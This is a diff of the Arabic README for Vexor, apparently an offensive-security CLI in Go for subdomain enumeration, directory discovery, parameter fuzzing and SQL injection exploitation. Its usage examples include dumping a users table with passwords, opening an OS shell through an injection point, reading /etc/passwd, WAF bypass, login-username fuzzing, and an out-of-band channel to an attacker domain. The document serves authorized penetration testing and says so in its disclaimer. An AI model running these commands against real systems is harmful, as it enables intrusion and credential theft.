@@ -1,132 +1,129 @@
-<p align="center">
-  <img alt="Vexor" src="https://img.shields.io/github/license/0xseif-code/vexor?style=flat-square">
-  <img alt="Go Version" src="https://img.shields.io/badge/Go-1.21%2B-00ADD8?logo=go&logoColor=white&style=flat-square">
-  <img alt="Language" src="https://img.shields.io/badge/Language-العربية%20%7C%20English-9f7be1?style=flat-square">
-</p>
-
-```
+```text
  ██╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗
  ██║   ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗
  ██║   ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝
  ╚██╗ ██╔╝██╔══╝   ██╔██╗ ██║   ██║██╔══██╗
   ╚████╔╝ ███████╗██╔╝ ██╗╚██████╔╝██║  ██║
    ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
-        Offensive Security Toolkit
 ```
 
-# Vexor
+**أداة أمنية هجومية عالية الأداء مكتوبة بلغة Go**
 
-**اقرأ هذا الملف بالإنجليزية: [English](README.md)**
+[ العربية (Arabic) ] | [ English ](README.md)
 
-**Vexor** أداة سطر أوامر مكتوبة بلغة **Go** لاكتشاف النطاقات الفرعية، واستكشاف
-المحتوى على الويب، واختبار الباراميترات (fuzzing)، واختبار حقن SQL
-(SQL injection). تُوزَّع كملف واحد ثنائي (single binary) بدون أي تبعيات خارجية.
+[![Go](https://img.shields.io/badge/Go-1.21%2B-00ADD8?style=flat-square&logo=go)](https://go.dev/dl/)
+[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
+[![OS](https://img.shields.io/badge/OS-Linux%20%7C%20macOS%20%7C%20Windows-brightgreen?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
+[![Release](https://img.shields.io/badge/Version-1.0.0-orange?style=flat-square)](https://github.com/0xseif-code/vexor/releases)
+
+Vexor أداة هجومية في ملف واحد (single binary) لاستكشاف الويب واختبار حقن SQL.
+لا تبعيات خارجية ولا شوائب — ملف واحد وقوائم كلمات وهدف، كفى.
+
+```bash
+# تثبيت سريع
+go install github.com/0xseif-code/vexor/cmd/vexor@latest
+```
 
 ---
 
-## المزايا
+## نظرة عامة
 
-- اكتشاف النطاقات الفرعية: DNS brute-force + crt.sh مع إزالة التكرار، وresolvers مخصّصة
-- اكتشاف الدلائل: استكشاف عبر قوائم الكلمات مع فلترة soft-404 والاستكشاف التعاودي (recursion) وقوالب الإضافات وتصفية حسب الحالة والحجم
-- اختبار الباراميترات: علامات `FUZZ` في الـ URL والهيدرات والـ body مع قواعد مطابقة وتصفية حسب الحالة والحجم وregex
-- محرك حقن SQL: اكتشاف boolean, error, time, union, stacked, OOB ثم استغلال كامل (`--dbs`, `--tables`, `--columns`, `--dump`, `--os-shell`, `--read-file`, `--write-file`)
-- مولّد حمولات مدرِك لـ WAF (`--auto-tamper`)، ومخرجات plain/json/csv، وقوائم كلمات SecLists مخزّنة محليًا، وأعلام مشتركة (بروكسي، تزامن، هيدرات)
+| الوحدة | الوظيفة | المحرّك / التقنية الأساسية |
+|---|---|---|
+| 🔍 **Subdomain** | استطلاع النطاقات الفرعية | Worker-Pool لنشاط DNS + crt.sh السلبي |
+| 📁 **Directory** | اكتشاف المسارات والملفات | فحص تعاودي + تصفية ذكية عبر Baseline |
+| 🎯 **Fuzzing** | تعدين الباراميترات | علامات `FUZZ` متعددة المواضع + تحليل الاستجابة |
+| 💉 **SQLi** | استغلال الثغرات | 7 تقنيات كشف أساسية + Tamper لتجاوز الـ WAF |
+| 📚 **Wordlists** | إدارة قوائم الكلمات | تنزيل تلقائي من SecLists حسب الطلب (`~/.vexor/`) |
 
 ---
 
 ## التثبيت
 
-### الطريقة 1 — `go install`
+### الطريقة 1 — Go Install (موصى بها)
 
 يتطلب **Go 1.21+**:
 
 ```bash
 go install github.com/0xseif-code/vexor/cmd/vexor@latest
 
-# تأكّد أن $GOPATH/bin (أو $HOME/go/bin) موجود في PATH
+# تأكّد أن $GOPATH/bin موجود في PATH
 export PATH="$PATH:$(go env GOPATH)/bin"    # Linux / macOS
 ```
 
-تحقّق من التثبيت:
-
-```bash
-$ vexor version
-Vexor v1.0.0 (build unknown)
-```
-
-### الطريقة 2 — من المصدر (`make`)
+### الطريقة 2 — من المصدر
 
 ```bash
 git clone https://github.com/0xseif-code/vexor.git
 cd vexor
 
-make build          # Linux / macOS → ./bin/vexor
-# أو مباشرة: go build -o vexor ./cmd/vexor
+make build          # Linux/macOS → ./bin/vexor
+# أو: go build -o vexor ./cmd/vexor
 
 # Windows
 go build -o vexor.exe ./cmd/vexor
-
-sudo install -m755 bin/vexor /usr/local/bin/    # اختياري: تثبيت النظام
 ```
 
-### الطريقة 3 — تحميل ملف ثنائي من الإصدارات
+### الطريقة 3 — ملف ثنائي من الإصدارات
 
-حمّل أحدث ملف ثنائي جاهز لمنصّتك من صفحة
+حمّل ملفًا جاهزًا لمنصّتك من صفحة
 [Releases](https://github.com/0xseif-code/vexor/releases). الأسماء بصيغة
-`vexor-<os>-<arch>[.exe]`، مثل `vexor-linux-amd64` و `vexor-darwin-arm64`
-و `vexor-windows-amd64.exe`.
-
----
-
-## البدء السريع
+`vexor-<os>-<arch>[.exe]`:
 
 ```bash
-# نزّل قوائم الكلمات مرة واحدة بعد التثبيت
+curl -sL -o vexor https://github.com/0xseif-code/vexor/releases/download/v1.0.0/vexor-linux-amd64
+chmod +x vexor && sudo mv vexor /usr/local/bin/
+```
+
+في أول تشغيل — نزّل قوائم الكلمات مرة واحدة ثم انطلق:
+
+```bash
 vexor update-wordlists
-
-# أوامر الأداة المتاحة
-vexor --help
+vexor subdomain -d example.com
 ```
-
-| الأمر | الوصف |
-|---|---|
-| `vexor subdomain` | اكتشاف النطاقات الفرعية (DNS brute-force + crt.sh) |
-| `vexor dir` | اكتشاف الملفات والدلائل على هدف ويب |
-| `vexor fuzz` | اختبار الـ URL / الهيدرات / الـ body بعلامات `FUZZ` |
-| `vexor sqli` | اكتشاف واستغلال حقن SQL |
-| `vexor update-wordlists` | إعادة تنزيل والتحقق من مرآة SecLists المحلية |
-| `vexor version` | عرض رقم الإصدار ومعلومات البناء |
-
-### الأعلام العامة (Global flags)
-
-كل الأوامر تشارك نفس أدوات التحكم العامة:
-
-```
---timeout <s>      مهلة الطلب العالمي بالثواني                    (الافتراضي: 10)
---threads <n>      عدد سلاسل التزامن العالمية                     (الافتراضي: 50)
---proxy <url>      بروكسي HTTP/SOCKS5، مثال: http://127.0.0.1:8080
---headers <h>      هيدر مخصّص قابل للتكرار، مثال: -H "User-Agent: custom"
---format <fmt>     صيغة المخرجات: plain, json, csv                (الافتراضي: plain)
---output <file>    حفظ النتائج في ملف (بالإضافة إلى stdout)
---silent           إخفاء الشعار وأشرطة التقدم والرسائل المعلوماتية
---no-color         تعطيل الألوان ANSI
-```
-
-النتائج تُكتب دائمًا إلى **stdout** (بدون ألوان ومناسبة للأنابيب) بينما تذهب
-السجلات والتقدّم إلى **stderr** — بالتالي `vexor dir -u URL | tee results.txt`
-يعمل مباشرة، و `--format json` جاهزة للاستخدام مع `jq`.
 
 ---
 
-## أمثلة الاستخدام
+## مرجع الأوامر
 
-### `vexor subdomain`
+كل الأوامر تشترك في الأعلام العامة أدناه. الشعار والسجلات والتقدّم تذهب إلى
+`stderr`؛ والنتائج إلى **stdout** (بدون ألوان، جاهزة للأنابيب) — لذلك
+`vexor dir -u URL | tee results.txt` تعمل مباشرة.
 
-اكتشاف نشط عبر DNS + سلبي عبر crt.sh:
+| العلم | الاختصار | النوع | الوصف | الافتراضي |
+|---|---|---|---|---|
+| `--timeout` | | int | مهلة الطلب العالمية (ثوانٍ) | `10` |
+| `--threads` | | int | عدد سلاسل التزامن العالمية | `50` |
+| `--proxy` | | string | بروكسي HTTP/SOCKS5، `http://127.0.0.1:8080` | |
+| `--headers` | | stringarray | هيدر مخصّص، قابل للتكرار | |
+| `--format` | | string | المخرج: `plain`, `json`, `csv` | `plain` |
+| `--output` | | string | حفظ النتائج في ملف أيضًا | |
+| `--silent` | | bool | إخفاء الشعار/الأشرطة/السجلات | `false` |
+| `--no-color` | | bool | تعطيل ألوان ANSI | `false` |
+
+### `subdomain` — اكتشاف النطاقات الفرعية
+
+DNS بروت فورس نشط + استعلامات crt.sh سلبية، مع إزالة التكرار من المصدرين.
+
+| العلم | الاختصار | النوع | الوصف | الافتراضي |
+|---|---|---|---|---|
+| `--domain` | `-d` | string | النطاق المستهدف (مطلوب ما لم تُستخدم `-l`) | |
+| `--list` | `-l` | string | ملف للنطاقات، نطاق في كل سطر | |
+| `--size` | `-s` | string | حجم قائمة الكلمات: `small`, `medium`, `large` | `medium` |
+| `--wordlist` | `-w` | string | مسار قائمة مخصّصة (يلغي `-s`) | |
+| `--resolvers` | | stringarray | خوادم DNS مخصّصة، قابلة للتكرار | |
+| `--active-only` | | bool | DNS فقط بدون crt.sh | `false` |
+| `--passive-only` | | bool | crt.sh فقط بدون DNS | `false` |
 
 ```bash
-$ vexor subdomain -d example.com -s medium --threads 100
+vexor subdomain -d example.com -s large --threads 150
+vexor subdomain -l domains.txt -s medium
+vexor subdomain -d example.com --resolvers 8.8.8.8:53 --resolvers 1.1.1.1:53 --active-only
+vexor subdomain -d example.com -w my-subdomains.txt --format json | jq -r '.subdomain'
+```
 
+```text
+$ vexor subdomain -d example.com -s medium --threads 100
 [*] starting subdomain enumeration: example.com (mode=dns+crtsh, threads=100, size=medium)
 api.example.com
 app.example.com
@@ -139,45 +136,72 @@ shop.example.com
 [+] subdomain enumeration complete: 42 total subdomains in 12.6s
 ```
 
-استهداف عدة نطاقات من ملف، أو استخدام قائمة كلمات مخصّصة:
+### `dir` — اكتشاف الملفات والدلائل
+
+فحص مسارات عبر قوائم الكلمات مع معايرة soft-404، وتكرار تعاودي، وقوالب
+للامتدادات.
+
+| العلم | الاختصار | النوع | الوصف | الافتراضي |
+|---|---|---|---|---|
+| `--url` | `-u` | string | الهدف، مثل `https://example.com/` (مطلوب) | |
+| `--size` | `-s` | string | حجم قائمة الكلمات | `medium` |
+| `--wordlist` | `-w` | string | مسار قائمة مخصّصة (يلغي `-s`) | |
+| `--ext` | `-x` | stringslice | امتدادات/قوالب، مثل `php,asp,all` | |
+| `--recursion` | `-r` | bool | التعمّق في الدلائل المكتشفة | `false` |
+| `--depth` | | int | أقصى عمق تعاودي (مع `-r`) | `2` |
+| `--match-status` | | string | إبلاغ هذه الأكواد فقط | |
+| `--filter-status` | | string | استبعاد هذه الأكواد | |
+| `--filter-size` | | string | استبعاد هذه الأحجام بالبايت | |
+| `--rate` | | int | أقصى طلب/ثانية (`0` = بلا حد) | `0` |
 
 ```bash
-vexor subdomain -l domains.txt -s large
-vexor subdomain -d example.com -w my-subdomains.txt
-vexor subdomain -d example.com --active-only --resolvers 8.8.8.8:853 --resolvers 1.1.1.1:53
+vexor dir -u https://example.com -x php,js -r --depth 2
+vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297
+vexor dir -u https://example.com --match-status 200,301,302 --rate 100
 ```
 
-### `vexor dir`
-
-اكتشاف المحتوى مع الاستكشاف التعاودي والتصفية:
-
-```bash
+```text
 $ vexor dir -u https://example.com -x php,js -r --depth 2
-
 [*] starting content discovery on https://example.com (threads=50, depth=2, exts=php,js)
 200	2.1 KB	https://example.com/index.php	Home
 200	1.4 KB	https://example.com/login.php	Login
-302	0 B		https://example.com/admin/	
-301	0 B		https://example.com/backup/	
+302	0 B		https://example.com/admin/
+301	0 B		https://example.com/backup/
 200	3.8 KB	https://example.com/admin/config.php	Configuration
 ...
 [+] content discovery complete: 18 findings, 4812 requests, 0 errors in 3m12s
 ```
 
-تخلّص من النتائج الزائفة بسهولة:
+### `fuzz` — اختبار الباراميترات
+
+علّم مواضع الحقن بعلامة `FUZZ` في الـ URL أو الهيدرات أو الـ body، مع تصفية
+الاستجابات حسب الكود والحجم وregex.
+
+| العلم | الاختصار | النوع | الوصف | الافتراضي |
+|---|---|---|---|---|
+| `--url` | `-u` | string | الهدف مع علامة `FUZZ` (مطلوب) | |
+| `--method` | `-X` | string | طريقة HTTP | `GET` |
+| `--data` | `-d` | string | جسم الطلب (يدعم علامات FUZZ) | |
+| `--wordlist` | `-w` | string | قائمة مخصّصة أو قالبًا جاهزًا | `parameters` |
+| `--match-status` | | string | إبلاغ هذه الأكواد فقط | |
+| `--filter-status` | | string | استبعاد هذه الأكواد | |
+| `--filter-size` | | string | استبعاد هذه الأحجام بالبايت | |
+| `--match-regex` | | string | إبلاغ الأجسام المطابقة لهذا regex فقط | |
+| `--filter-regex` | | string | استبعاد الأجسام المطابقة لهذا regex | |
+| `--delay` | | duration | تأخير بين الطلبات، مثل `100ms` | `0` |
+
+القوالب الجاهزة: `parameters`, `extensions`, `usernames`, `passwords`,
+`passwords-large`, `endpoints` — أو مرّر أي مسار ملف كقيمة لـ `-w`.
 
 ```bash
-vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297 -r
-vexor dir -u https://example.com --match-status 200,301,302 --rate 100
+vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
+vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
+vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
+vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
 ```
 
-### `vexor fuzz`
-
-علّم مواضع الاختراق بعلامة `FUZZ` — في الـ URL أو الهيدرات أو الـ body:
-
-```bash
+```text
 $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500
-
 [*] starting fuzzing GET https://example.com/api/query?id=FUZZ (threads=50, wordlist=parameters)
 [200] https://example.com/api/query?id=admin (id=admin)
 [200] https://example.com/api/query?id=debug (id=debug)
@@ -186,24 +210,51 @@ $ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-st
 [+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
 ```
 
-فحص الطريقة + الـ body، وتصفية التشويش:
+### `sqli` — كشف واستغلال حقن SQL
+
+سبع تقنيات كشف عبر كل الباراميترات — boolean, error, time, union, stacked,
+inline, OOB — ثم استغلال كامل على أول نقطة مؤكَّدة.
+
+| العلم | الاختصار | النوع | الوصف | الافتراضي |
+|---|---|---|---|---|
+| `--url` | `-u` | string | الهدف، مثل `https://example.com/page?id=1` | |
+| `--request` | `-r` | string | ملف طلب خام بصيغة Burp | |
+| `--param` | `-p` | string | اختبار باراميتر واحد فقط | |
+| `--dbms` | | string | فرض قاعدة بيانات: `mysql`, `postgres`, `mssql`, `oracle`, `sqlite` | `auto` |
+| `--level` | | int | شدة الاختبار (1-5) | `1` |
+| `--risk` | | int | خطورة الحمولات (1-3) | `1` |
+| `--tamper` | | stringslice | سكربتات Tamper، مثل `space2comment,randomcase` | |
+| `--auto-tamper` | | bool | بصمة الـ WAF + سلسلة Tamper مقترحة | `false` |
+| `--oob-domain` | | string | نطاق لقنوات OOB (DNS/HTTP) | |
+| `--dbs` | | bool | سرد قواعد البيانات | `false` |
+| `--tables` | | bool | سرد الجداول | `false` |
+| `--columns` | | bool | سرد الأعمدة | `false` |
+| `--dump` | | bool | تفريغ محتويات جدول | `false` |
+| `--database` | `-D` | string | اسم القاعدة لـ `--tables/--columns/--dump` | |
+| `--table` | `-T` | string | اسم الجدول لـ `--columns/--dump` | |
+| `--column` | `-C` | stringslice | أعمدة محدّدة للتفريغ، قابلة للتكرار | |
+| `--os-shell` | | bool | قشرة نظام تفاعلية عبر نقطة الحقن | `false` |
+| `--read-file` | | string | قراءة ملف من خادم قاعدة البيانات | |
+| `--write-file` | | string | كتابة ملف محلي إلى الخادم | |
+| `--file-dest` | | string | المسار البعيد لـ `--write-file` | اسم الملف |
 
 ```bash
-vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
-vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
-vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
+# فحص حقن SQL أساسي
+vexor sqli -u "http://target.com/page.php?id=1"
+
+# تجاوز WAF تلقائي + استخراج البيانات
+vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs
+
+# تفريغ جدول
+vexor sqli -u "http://target.com/page.php?id=1" --dump -D shop -T users -C id,username,password
+
+# استحواذ كامل
+vexor sqli -u "http://target.com/page.php?id=1" --os-shell
+vexor sqli -u "http://target.com/page.php?id=1" --read-file /etc/passwd
 ```
 
-القوالب المدمجة: `parameters`, `extensions`, `usernames`, `passwords`,
-`passwords-large`, `endpoints` — أو مرّر أي مسار ملف كقيمة لـ `-w`.
-
-### `vexor sqli`
-
-الاكتشاف عبر كل الباراميترات (boolean, error, time, union, stacked, inline, OOB):
-
-```bash
+```text
 $ vexor sqli -u "https://example.com/page?id=1" --level 2
-
 [*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=50)
 URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
 URL query parameter/GET/id technique=error   dbms=mysql confidence=88
@@ -211,36 +262,28 @@ POST form parameter/POST/user technique=time      dbms=mysql confidence=76
 ...
 [+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
 [i] fingerprinted DBMS: mysql
+
+$ vexor sqli -u "https://example.com/page?id=1" --dbs
+...
+[i] first confirmed injection point: GET/id (boolean)
+information_schema
+shop
+mysql
+...
+[+] done in 3m41s
 ```
 
-ثم استغل أول نقطة تم تأكيدها:
+### `update-wordlists` — إدارة الذاكرة المحلية
 
 ```bash
-vexor sqli -u "https://example.com/page?id=1" --dbs
-vexor sqli -u "https://example.com/page?id=1" --tables -D shop
-vexor sqli -u "https://example.com/page?id=1" --columns -D shop -T users
-vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users -C id,username,password
-vexor sqli -u "https://example.com/page?id=1" --os-shell
-vexor sqli -u "https://example.com/page?id=1" --read-file /etc/passwd
+vexor update-wordlists
 ```
 
-يدعم أيضًا طلبات Burp الخام وسلاسل الـ tamper وقنوات الـ out-of-band:
+ينزّل ويتحقق من مرآة SecLists في `~/.vexor/wordlists`. نفّذه مرة واحدة بعد
+التثبيت، وكلما أردت بيانات محدّثة.
 
-```bash
-vexor sqli -r request.txt -p id
-vexor sqli -u "https://example.com/page?id=1" --auto-tamper
-vexor sqli -u "https://example.com/page?id=1" --tamper space2comment,randomcase
-vexor sqli -u "https://example.com/page?id=1" --oob-domain yourdomain.attacker.com
-```
-
-### `vexor update-wordlists`
-
-Vexor يخزّن قوائم الكلمات في `~/.vexor/wordlists` ويجلبها من مرآة SecLists.
-نفّذه مرة واحدة بعد التثبيت — وفي أي وقت تريد تحديث البيانات:
-
-```bash
+```text
 $ vexor update-wordlists
-
 [*] re-downloading all wordlists into ~/.vexor/wordlists
 [*] downloading...  65.30% (18.4 MB / 28.2 MB)
 [+] wordlist cache updated: 3 files in 46.8s
@@ -249,47 +292,38 @@ $ vexor update-wordlists
 [i]   fuzz/parameters     5.7 MB  sha256=b2a9d0134e6e
 ```
 
-> الأوامر `subdomain` و `dir` و `fuzz` تختار قائمة الكلمات تلقائيًا حسب الحجم
-> (`-s small|medium|large`) أو مسار صريح (`-w`).
-
 ---
 
-## صيغ المخرجات
+## قوائم الكلمات والإعداد المتقدم
+
+- **مكان الذاكرة:** `~/.vexor/wordlists/` — تُنزّل تلقائيًا عند أول استخدام،
+  وتُحدَّث عبر `vexor update-wordlists`.
+- **حجم (`-s`):** `small`, `medium`, `large`. أوامر `subdomain`, `dir`,
+  و`fuzz` تختار الحجم المناسب تلقائيًا.
+- **قوالب Fuzz (`-w`):** `parameters`, `extensions`, `usernames`,
+  `passwords`, `passwords-large`, `endpoints`.
+- **قوائم مخصّصة (`-w /path/to/file.txt`):** أي ملف محلي، كلمة في كل سطر —
+  يلغي قالب الحجم.
+
+صيغ المخرجات حسب الفحص:
 
 ```bash
-# JSON، مرّرها إلى jq
 vexor subdomain -d example.com --format json | jq -r '.subdomain'
-
-# CSV إلى جدول بيانات
 vexor dir -u https://example.com --format csv -o results.csv
-
-# الصيغة العادية تعمل دائمًا؛ stdout يبقى مناسبًا للأنابيب
 vexor sqli -u "https://example.com/page?id=1" | tee sqli.log
 ```
 
 ---
 
-## هيكلة المشروع
+## تنبيه قانوني
 
-```
-cmd/vexor/        نقطة الدخول للـ CLI (أوامر Cobra)
-internal/fuzz/    محرك اختبار الباراميترات
-internal/sqli/    اكتشاف واستغلال حقن SQL
-internal/enum/    اكتشاف النطاقات الفرعية والدلائل
-internal/httpclient/  عميل HTTP سريع ومتزامن
-internal/wordlists/   مرآة SecLists المحلية والتحقق من التكامل
-```
-
----
-
-## تنبيه قانوني (Legal & Disclaimer)
-
-**استخدم الأداة بمسؤولية. للاختبار المأذون فقط.**
-
-Vexor أداة أمنية هجومية. يُسمح باستخدامها فقط ضد أنظمة تملكها أو تملك إذنًا
-كتابيًا صريحًا لاختبارها. الوصول غير المصرح به إلى أنظمة الكمبيوتر غير قانوني
-في معظم الدول. لا يتحمّل المؤلف أي مسؤولية عن سوء الاستخدام.
+> **استخدم الأداة بمسؤولية. للاختبار المأذون فقط.**
+>
+> Vexor أداة أمنية هجومية. يُسمح باستخدامها فقط ضد أنظمة تملكها أو حصلت على
+> إذن كتابي لاختبارها. الوصول غير المصرح به إلى أنظمة الكمبيوتر غير قانوني
+> في معظم الدول. لا يتحمّل المؤلف أي مسؤولية عن سوء الاستخدام.
 
 ## الترخيص
 
-تُوزَّع الأداة بموجب [MIT License](LICENSE). الحقوق محفوظة © (c) 2026 0xseif-code.
+تُوزَّع الأداة بموجب [MIT License](LICENSE). الحقوق محفوظة © (c) 2026
+0xseif-code.
